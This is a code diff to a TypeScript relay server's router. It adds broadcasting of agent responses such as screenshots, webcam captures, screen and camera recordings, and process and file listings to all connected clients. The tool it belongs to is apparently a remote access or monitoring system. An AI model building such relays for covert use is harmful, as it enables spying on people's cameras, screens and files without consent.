@@ -89,6 +89,31 @@ export class RouteHandler {
                 return;
             }
             
+            // If agent sends response without 'to' field, broadcast to all clients
+            // This handles responses like SCREENSHOT, CAMSHOT, etc.
+            if (msg.type === CommandType.SCREENSHOT || 
+                msg.type === CommandType.CAMSHOT || 
+                msg.type === CommandType.CAM_RECORD || 
+                msg.type === CommandType.SCR_RECORD ||
+                msg.type === CommandType.STREAM_DATA ||
+                msg.type === CommandType.APP_LIST ||
+                msg.type === CommandType.PROC_LIST ||
+                msg.type === CommandType.FILE_LIST) {
+                // Broadcast agent response to all clients
+                if (!msg.from) {
+                    msg.from = conn.id;
+                }
+                const clients = this.connectionRegistry.getConnectionsByRole('CLIENT');
+                clients.forEach(client => {
+                    if (client.isAlive) {
+                        const responseMsg = { ...msg, to: client.id };
+                        client.send(JSON.stringify(responseMsg));
+                    }
+                });
+                Logger.info(`[Router] Broadcasted agent response ${msg.type} from ${conn.id} to ${clients.length} clients`);
+                return;
+            }
+            
             if (msg.type !== CommandType.PONG && 
                 msg.type !== CommandType.ECHO && 
                 msg.type !== CommandType.ERROR &&
